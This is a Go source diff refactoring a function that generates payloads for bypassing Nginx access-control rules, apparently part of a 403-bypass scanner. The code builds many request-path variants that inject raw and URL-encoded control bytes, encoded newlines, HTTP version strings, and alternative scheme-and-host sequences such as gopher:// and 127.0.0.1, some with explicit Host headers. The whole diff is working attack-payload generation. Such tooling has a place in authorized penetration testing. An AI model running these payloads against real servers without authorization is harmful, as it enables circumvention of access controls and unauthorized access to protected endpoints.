@@ -10,21 +10,33 @@ import (
 )
 
 /*
-GenerateNginxACLsBypassPayloads
+GenerateNginxACLsBypassPayloads generates payloads aimed at bypassing Nginx ACLs
+and similar proxy/server misconfigurations.
+
+Techniques include:
+- Appending/prepending/inserting special characters (raw and URL-encoded).
+- Using URL-encoded newlines (%0A) to potentially split processing.
+- Injecting HTTP version strings after newlines.
+- Injecting full alternative URIs (scheme://host/path) after newlines.
+
+If any generated path segment (before appending the original query) contains
+literal '?' or '#' characters, additional payloads are generated where these
+special characters are percent-encoded (%3F and %23) to ensure the original
+query string can be appended unambiguously.
 */
 func (pg *PayloadGenerator) GenerateNginxACLsBypassPayloads(targetURL string, bypassModule string) []BypassPayload {
 	var allJobs []BypassPayload
 
 	parsedURL, err := rawurlparser.RawURLParse(targetURL)
 	if err != nil {
-		GB403Logger.Error().Msgf("Failed to parse URL")
+		GB403Logger.Error().Msgf("Failed to parse URL: %s", targetURL)
 		return allJobs
 	}
 
-	basePath := parsedURL.Path
+	basePath := parsedURL.Path // Path might contain raw '?' or '#'
 
-	// Extract query string if it exists
 	query := ""
+	// Use Query as it preserves encoding better for this purpose if needed later
 	if parsedURL.Query != "" {
 		query = "?" + parsedURL.Query
 	}
@@ -38,318 +50,325 @@ func (pg *PayloadGenerator) GenerateNginxACLsBypassPayloads(targetURL string, by
 		BypassModule: bypassModule,
 	}
 
-	// Define comprehensive bypass character sets
-	// Raw bytes must be used directly in the string via byte conversion
-
-	// Flask bypass characters
-	flaskBypassBytes := []byte{
-		0x85, // Next line character
-		0xA0, // Non-breaking space
-		0x1F, // Information separator one
-		0x1E, // Information separator two
-		0x1D, // Information separator three
-		0x1C, // Information separator four
-		0x0C, // Form feed
-		0x0B, // Vertical tab
-	}
-
-	// Spring Boot bypass characters
-	springBootBypassBytes := []byte{
-		0x09, // Tab character
-	}
+	// --- Define bypass characters ---
+	flaskBypassBytes := []byte{0x85, 0xA0, 0x1F, 0x1E, 0x1D, 0x1C, 0x0C, 0x0B}
+	springBootBypassBytes := []byte{0x09}
 	springBootStrings := []string{";"}
+	nodejsBypassBytes := []byte{0xA0, 0x09, 0x0C}
 
-	// Node.js bypass characters
-	nodejsBypassBytes := []byte{
-		0xA0, // Non-breaking space
-		0x09, // Tab character
-		0x0C, // Form feed
-	}
-
-	// Combine all unique bypass characters
 	rawBypassChars := make([]string, 0)
 	encodedBypassChars := make([]string, 0)
-	charMap := make(map[string]bool) // To track uniqueness
+	charMap := make(map[string]bool) // Track uniqueness
 
-	// Process byte-based characters
 	processBytes := func(bytes []byte) {
 		for _, b := range bytes {
-			// Raw character
-			rawChar := string([]byte{b})
+			rawChar := string([]byte{b}) // Keep raw byte representation
 			if !charMap[rawChar] {
-				rawBypassChars = append(rawBypassChars, rawChar)
-				charMap[rawChar] = true
+				// Only add raw if not problematic for URI construction later (like newline)
+				if b != '\n' {
+					rawBypassChars = append(rawBypassChars, rawChar)
+					charMap[rawChar] = true
+				} else if !charMap["\n_placeholder"] { // Use placeholder to track newline addition
+					charMap["\n_placeholder"] = true // Mark newline as seen, but don't add raw '\n' to list
+				}
 			}
-
-			// URL-encoded version
 			encodedChar := fmt.Sprintf("%%%02X", b)
-			encodedBypassChars = append(encodedBypassChars, encodedChar)
+			// Avoid duplicate encoded versions if byte value is same (e.g., 0x09 from multiple lists)
+			if !charMap[encodedChar] {
+				encodedBypassChars = append(encodedBypassChars, encodedChar)
+				charMap[encodedChar] = true
+			}
 		}
 	}
 
-	// Add all byte-based characters
 	processBytes(flaskBypassBytes)
 	processBytes(springBootBypassBytes)
 	processBytes(nodejsBypassBytes)
 
-	// Add string-based characters
 	for _, s := range springBootStrings {
 		if !charMap[s] {
 			rawBypassChars = append(rawBypassChars, s)
 			charMap[s] = true
 		}
-		// No need to URL-encode simple ASCII characters like semicolon
-		encodedBypassChars = append(encodedBypassChars, url.QueryEscape(s))
+		// Add encoded version if different and not already added
+		encodedS := url.QueryEscape(s)
+		if encodedS != s && !charMap[encodedS] {
+			encodedBypassChars = append(encodedBypassChars, encodedS)
+			charMap[encodedS] = true
+		}
 	}
 
-	// Add the %0A character (newline) since it can cut the path (Nginx rewrite)
-	// Keep the raw '\n' in rawBypassChars for non-URI based tests if needed elsewhere,
-	// but only use encodedNewline ('%0A') for URI construction below.
-	if !charMap["\n"] {
-		rawBypassChars = append(rawBypassChars, "\n")
-		charMap["\n"] = true
+	// Handle newline (%0A) specifically for encoded list
+	encodedNewline := "%0A"
+	if !charMap[encodedNewline] {
+		encodedBypassChars = append(encodedBypassChars, encodedNewline)
+		charMap[encodedNewline] = true
 	}
-	encodedNewline := "%0A" // Use this consistently for URIs
-	encodedBypassChars = append(encodedBypassChars, encodedNewline)
+	// Ensure we track raw newline was considered, even if not added to rawBypassChars
+	if !charMap["\n_placeholder"] {
+		charMap["\n_placeholder"] = true
+	}
 
-	// Split the path into segments to insert characters at various positions
-	pathSegments := strings.Split(strings.TrimPrefix(basePath, "/"), "/")
+	// Split the path into segments
+	// Handle root path correctly: "/" -> [""]
+	// Handle "/a/b" -> ["a", "b"]
+	var pathSegments []string
+	trimmedPath := strings.TrimPrefix(basePath, "/")
+	if basePath == "/" {
+		pathSegments = []string{""} // Represent root segment explicitly? Or handle differently?
+		// Let's treat "/" as having one segment "" for insertion logic? No, Split returns [""]
+		// If basePath is just "/", Split("", "/") gives [""].
+		// If basePath is "/a/b", Split("a/b", "/") gives ["a", "b"].
+		// If basePath is "/a/", Split("a/", "/") gives ["a", ""].
+		pathSegments = strings.Split(trimmedPath, "/")
+	} else if basePath == "" {
+		// Treat empty path as root for consistency? No, path is likely intended to be empty.
+		pathSegments = []string{}
+	} else {
+		pathSegments = strings.Split(trimmedPath, "/")
+	}
 
-	// Helper function to add a job with a specific URI
-	addJob := func(uri string, headers ...Headers) {
-		job := baseJob
-		job.RawURI = uri
+	// --- Helper function to add jobs ---
+	// Takes the path part (before query) and optional headers
+	addJob := func(pathPart string, headers ...Headers) {
+		// 1. Create the standard job
+		job := baseJob                // Copy base template
+		job.RawURI = pathPart + query // Append original query
 		if len(headers) > 0 {
 			job.Headers = headers
 		}
 		job.PayloadToken = GeneratePayloadToken(job)
 		allJobs = append(allJobs, job)
-	}
 
-	// 1. Generate payloads by appending characters to the end of the path
-	for _, char := range rawBypassChars {
-		// Only add raw characters if they are not problematic for fasthttp URI parsing
-		if char != "\n" {
-			addJob(basePath + char + query)
-		}
-	}
-	for _, encoded := range encodedBypassChars {
-		addJob(basePath + encoded + query)
-	}
-
-	// 2. Try after a trailing slash if the path doesn't already end with one
-	if !strings.HasSuffix(basePath, "/") {
-		for _, char := range rawBypassChars {
-			if char != "\n" {
-				addJob(basePath + "/" + char + query)
+		// 2. Check if pathPart contains special chars and add encoded variant if needed
+		if strings.ContainsAny(pathPart, "?#") {
+			encodedPathPart := encodeQueryAndFragmentChars(pathPart)
+			// Ensure encoding actually changed something before adding
+			if encodedPathPart != pathPart {
+				encodedJob := baseJob                       // Copy base template again
+				encodedJob.RawURI = encodedPathPart + query // Use encoded path + query
+				if len(headers) > 0 {
+					encodedJob.Headers = headers
+				}
+				// Generate a distinct token if desired, or reuse base logic
+				encodedJob.PayloadToken = GeneratePayloadToken(encodedJob)
+				allJobs = append(allJobs, encodedJob)
 			}
 		}
+	}
+
+	// --- Generate Payloads ---
+
+	// 1. Append characters to the end of the path
+	for _, char := range rawBypassChars {
+		addJob(basePath + char) // Pass path part without query
+	}
+	for _, encoded := range encodedBypassChars {
+		addJob(basePath + encoded) // Pass path part without query
+	}
+
+	// 2. Try after a trailing slash
+	if !strings.HasSuffix(basePath, "/") {
+		pathWithSlash := basePath + "/"
+		for _, char := range rawBypassChars {
+			addJob(pathWithSlash + char)
+		}
 		for _, encoded := range encodedBypassChars {
-			addJob(basePath + "/" + encoded + query)
+			addJob(pathWithSlash + encoded)
+		}
+	} else {
+		// If path already ends with "/", just append after it (avoid double slash from pathWithSlash)
+		for _, char := range rawBypassChars {
+			addJob(basePath + char) // Same as case 1, effectively deduplicated by map later if basePath was "/"
+		}
+		for _, encoded := range encodedBypassChars {
+			addJob(basePath + encoded) // Same as case 1
 		}
 	}
 
 	// 3. Insert characters at the beginning of the path
+	// Need to handle root path "/" carefully
+	leadingSlash := "/"
+	pathWithoutLeadingSlash := strings.TrimPrefix(basePath, "/")
+	if basePath == "/" {
+		pathWithoutLeadingSlash = "" // For root, inserting at beginning means /<char>
+	}
+
 	for _, char := range rawBypassChars {
-		if char != "\n" {
-			addJob("/" + char + strings.TrimPrefix(basePath, "/") + query)
-		}
+		addJob(leadingSlash + char + pathWithoutLeadingSlash)
 	}
 	for _, encoded := range encodedBypassChars {
-		addJob("/" + encoded + strings.TrimPrefix(basePath, "/") + query)
+		addJob(leadingSlash + encoded + pathWithoutLeadingSlash)
 	}
 
-	// 4a. Insert characters immediately AFTER each path segment (except the last)
+	// 4a. Insert characters immediately AFTER each path segment (before the next '/')
 	// Generates patterns like /segment1<char>/segment2...
-	if len(pathSegments) > 1 {
-		for i := 0; i < len(pathSegments)-1; i++ { // Iterate up to the second-to-last segment
-			// Join segments up to and including i
-			prefix := "/" + strings.Join(pathSegments[:i+1], "/")
-			// Join segments after i, adding a leading slash
-			suffix := "/" + strings.Join(pathSegments[i+1:], "/")
+	// Check if pathSegments is usable (not empty path, not just root "/")
+	if len(pathSegments) > 0 && !(len(pathSegments) == 1 && pathSegments[0] == "") {
+		for i := 0; i < len(pathSegments); i++ {
+			// Construct prefix including the current segment
+			prefixSegments := pathSegments[:i+1]
+			prefix := "/" + strings.Join(prefixSegments, "/") // e.g., "/seg1" or "/seg1/seg2"
 
+			// Construct suffix starting from the next segment
+			suffix := ""
+			if i+1 < len(pathSegments) {
+				suffixSegments := pathSegments[i+1:]
+				suffix = "/" + strings.Join(suffixSegments, "/") // e.g., "/seg2/seg3" or "/seg3"
+			}
+
+			// Insert characters between prefix and suffix
 			for _, char := range rawBypassChars {
-				if char != "\n" {
-					addJob(prefix + char + suffix + query)
-				}
+				addJob(prefix + char + suffix)
 			}
 			for _, encoded := range encodedBypassChars {
-				addJob(prefix + encoded + suffix + query)
+				addJob(prefix + encoded + suffix)
 			}
 		}
 	}
 
-	// 4b. Insert characters immediately BEFORE each path segment (except the first)
+	// 4b. Insert characters immediately BEFORE each path segment (after the preceding '/')
 	// Generates patterns like /segment1/<char>segment2...
-	if len(pathSegments) > 1 {
-		for i := 1; i < len(pathSegments); i++ { // Iterate starting from the second segment
-			// Join segments before i, adding a leading slash
-			prefix := "/" + strings.Join(pathSegments[:i], "/")
-			// Get the current segment
+	if len(pathSegments) > 0 && !(len(pathSegments) == 1 && pathSegments[0] == "") {
+		for i := 0; i < len(pathSegments); i++ { // Iterate through each segment
+			// Construct prefix up to the segment *before* the current one
+			prefix := "/"
+			if i > 0 {
+				prefixSegments := pathSegments[:i]
+				prefix = "/" + strings.Join(prefixSegments, "/") + "/" // e.g., "/" or "/seg1/"
+			}
+
+			// Get the current segment and the rest of the path
 			currentSegment := pathSegments[i]
-			// Get the rest of the path segments after the current one
 			restOfPath := ""
-			if i < len(pathSegments)-1 {
+			if i+1 < len(pathSegments) {
 				restOfPath = "/" + strings.Join(pathSegments[i+1:], "/")
 			}
 
+			// Insert character before the current segment
 			for _, char := range rawBypassChars {
-				if char != "\n" {
-					addJob(prefix + "/" + char + currentSegment + restOfPath + query)
-				}
+				addJob(prefix + char + currentSegment + restOfPath)
 			}
 			for _, encoded := range encodedBypassChars {
-				addJob(prefix + "/" + encoded + currentSegment + restOfPath + query)
+				addJob(prefix + encoded + currentSegment + restOfPath)
 			}
 		}
 	}
 
-	// 5. NEW: Insert characters after the first character of each path segment
-	for i, segment := range pathSegments {
-		if len(segment) >= 2 { // Must have at least 2 characters
-			// Create path prefix (everything before current segment)
-			prefix := "/"
-			if i > 0 {
-				prefix = "/" + strings.Join(pathSegments[:i], "/") + "/"
-			}
+	// 5. Insert characters after the first character of each path segment
+	if len(pathSegments) > 0 && !(len(pathSegments) == 1 && pathSegments[0] == "") {
+		for i, segment := range pathSegments {
+			if len(segment) >= 1 { // Need at least one character to insert after
+				// Create path prefix (everything before current segment)
+				prefix := "/"
+				if i > 0 {
+					prefix = "/" + strings.Join(pathSegments[:i], "/") + "/"
+				}
 
-			// Create path suffix (everything after current segment)
-			suffix := ""
-			if i < len(pathSegments)-1 {
-				suffix = "/" + strings.Join(pathSegments[i+1:], "/")
-			}
+				// Create path suffix (everything after current segment)
+				suffix := ""
+				if i+1 < len(pathSegments) {
+					suffix = "/" + strings.Join(pathSegments[i+1:], "/")
+				}
 
-			// Insert characters after first character of segment
-			firstChar := segment[0:1]
-			restOfSegment := segment[1:]
+				// Insert characters after first character of segment
+				firstChar := segment[0:1]
+				restOfSegment := ""
+				if len(segment) > 1 {
+					restOfSegment = segment[1:]
+				}
 
-			for _, char := range rawBypassChars {
-				if char != "\n" {
-					modifiedPath := prefix + firstChar + char + restOfSegment + suffix + query
+				for _, char := range rawBypassChars {
+					modifiedPath := prefix + firstChar + char + restOfSegment + suffix
+					addJob(modifiedPath)
+				}
+				for _, encoded := range encodedBypassChars {
+					modifiedPath := prefix + firstChar + encoded + restOfSegment + suffix
 					addJob(modifiedPath)
 				}
 			}
-			for _, encoded := range encodedBypassChars {
-				modifiedPath := prefix + firstChar + encoded + restOfSegment + suffix + query
-				addJob(modifiedPath)
-			}
 		}
 	}
 
-	// HTTP version-like strings
-	httpVersions := []string{
-		"HTTP/1.1",
-		"HTTP/1.0",
-		"HTTP/2.0",
-		"HTTP/0.9",
+	// --- HTTP version and complex bypasses ---
+	httpVersions := []string{"HTTP/1.1", "HTTP/1.0", "HTTP/2.0", "HTTP/0.9"}
+	schemes := []string{"http://", "https://", "file://", "gopher://"} // Common schemes
+	alternativeHosts := []string{"localhost", "127.0.0.1"}             // Common alternative hosts
+
+	// Add port variants if available
+	if parsedURL.Port != "" {
+		alternativeHosts = append(alternativeHosts, "localhost:"+parsedURL.Port, "127.0.0.1:"+parsedURL.Port)
+	} else { // Add common default ports otherwise
+		alternativeHosts = append(alternativeHosts, "localhost:80", "localhost:443", "127.0.0.1:80", "127.0.0.1:443")
 	}
+	// Also include the original host in the list for some variations
+	alternativeHosts = append(alternativeHosts, parsedURL.Host)
 
-	// 6. Generate whitespace+HTTP version payloads
+	// 6. Generate whitespace+HTTP version payloads (%0A only)
 	for _, httpVersion := range httpVersions {
-		// URL-encoded newline ONLY
-		addJob(basePath + encodedNewline + httpVersion + query)
+		// Append to end
+		addJob(basePath + encodedNewline + httpVersion)
 
-		// Try at path segment positions
-		if len(pathSegments) > 1 {
-			for i := 0; i < len(pathSegments); i++ {
+		// Insert at path segment positions
+		if len(pathSegments) > 0 && !(len(pathSegments) == 1 && pathSegments[0] == "") {
+			for i := 0; i <= len(pathSegments); i++ { // Iterate one past last segment for appending
 				prefix := "/" + strings.Join(pathSegments[:i], "/")
-				if i > 0 {
+				// Ensure trailing slash if not the very beginning
+				if i > 0 && !strings.HasSuffix(prefix, "/") {
 					prefix += "/"
+				} else if i == 0 {
+					prefix = "/" // Start with slash if inserting at beginning
 				}
 
 				suffix := ""
 				if i < len(pathSegments) {
-					suffix = "/" + strings.Join(pathSegments[i:], "/")
+					suffix = strings.Join(pathSegments[i:], "/")
 				}
 
-				// URL-encoded newline ONLY
-				addJob(prefix + encodedNewline + httpVersion + suffix + query)
+				// Insert newline + version between prefix and suffix
+				addJob(strings.TrimSuffix(prefix, "/") + encodedNewline + httpVersion + "/" + suffix)
 			}
 		}
 	}
 
-	// Scheme techniques
-	schemes := []string{
-		"http://",
-		"https://",
-		"file://",
-		"gopher://",
-	}
-
-	// Alternative hosts
-	alternativeHosts := []string{
-		"localhost",
-		"127.0.0.1",
-	}
-
-	// Add port variants
-	if parsedURL.Port != "" {
-		alternativeHosts = append(alternativeHosts,
-			"localhost:"+parsedURL.Port,
-			"127.0.0.1:"+parsedURL.Port)
-	} else {
-		alternativeHosts = append(alternativeHosts,
-			"localhost:80", "localhost:443",
-			"127.0.0.1:80", "127.0.0.1:443")
-	}
-
-	// 7. Complex bypass patterns with host routing
+	// 7. Complex bypass patterns with host routing (%0A only)
 	for _, httpVersion := range httpVersions {
 		for _, scheme := range schemes {
 			for _, altHost := range alternativeHosts {
-				// URL-encoded newlines ONLY
-				encodedUri := basePath + encodedNewline + httpVersion + encodedNewline + scheme + altHost + basePath + query
+				// Construct the core injected part
+				injectionPart := encodedNewline + httpVersion + encodedNewline + scheme + altHost
 
-				// Basic encoded variant
-				addJob(encodedUri)
+				// a) Append injection + original path to the end of the base path
+				pathVariantA := basePath + injectionPart + basePath
+				addJob(pathVariantA)
+				addJob(pathVariantA, Headers{Header: "Host", Value: parsedURL.Host}) // With explicit Host
 
-				// With explicit Host header
-				addJob(encodedUri, Headers{
-					Header: "Host",
-					Value:  parsedURL.Host,
-				})
-
-				// With original host (using encoded newline)
-				addJob(basePath + encodedNewline + httpVersion + encodedNewline + scheme + parsedURL.Host + basePath + query)
-
-				// Try at different path segments
-				if len(pathSegments) > 1 {
-					for i := 0; i < len(pathSegments); i++ {
+				// b) Insert injection + original path at segment boundaries
+				if len(pathSegments) > 0 && !(len(pathSegments) == 1 && pathSegments[0] == "") {
+					for i := 0; i <= len(pathSegments); i++ {
 						prefix := "/" + strings.Join(pathSegments[:i], "/")
-						if i > 0 {
+						if i > 0 && !strings.HasSuffix(prefix, "/") {
 							prefix += "/"
+						} else if i == 0 {
+							prefix = "/"
 						}
 
 						suffix := ""
 						if i < len(pathSegments) {
-							suffix = "/" + strings.Join(pathSegments[i:], "/")
+							suffix = strings.Join(pathSegments[i:], "/")
 						}
 
-						// URL-encoded newlines ONLY with alternative host
-						encodedSegmentUri := prefix + encodedNewline + httpVersion + encodedNewline + scheme + altHost + basePath + suffix + query
-						addJob(encodedSegmentUri)
-
-						// With explicit Host header
-						addJob(encodedSegmentUri, Headers{
-							Header: "Host",
-							Value:  parsedURL.Host,
-						})
-
-						// URL-encoded newlines ONLY with original host
-						encodedOrigHostSegmentUri := prefix + encodedNewline + httpVersion + encodedNewline + scheme + parsedURL.Host + basePath + suffix + query
-						addJob(encodedOrigHostSegmentUri)
-
-						// With explicit Host header
-						addJob(encodedOrigHostSegmentUri, Headers{
-							Header: "Host",
-							Value:  parsedURL.Host,
-						})
+						// Insert injection + original basePath between prefix and suffix
+						pathVariantB := strings.TrimSuffix(prefix, "/") + injectionPart + basePath + "/" + suffix
+						addJob(pathVariantB)
+						addJob(pathVariantB, Headers{Header: "Host", Value: parsedURL.Host}) // With explicit Host
 					}
 				}
 			}
 		}
 	}
 
+	// Final log message (unchanged as requested)
 	GB403Logger.Debug().BypassModule(bypassModule).Msgf("Generated %d Nginx bypass payloads for %s\n", len(allJobs), targetURL)
 	return allJobs
 }
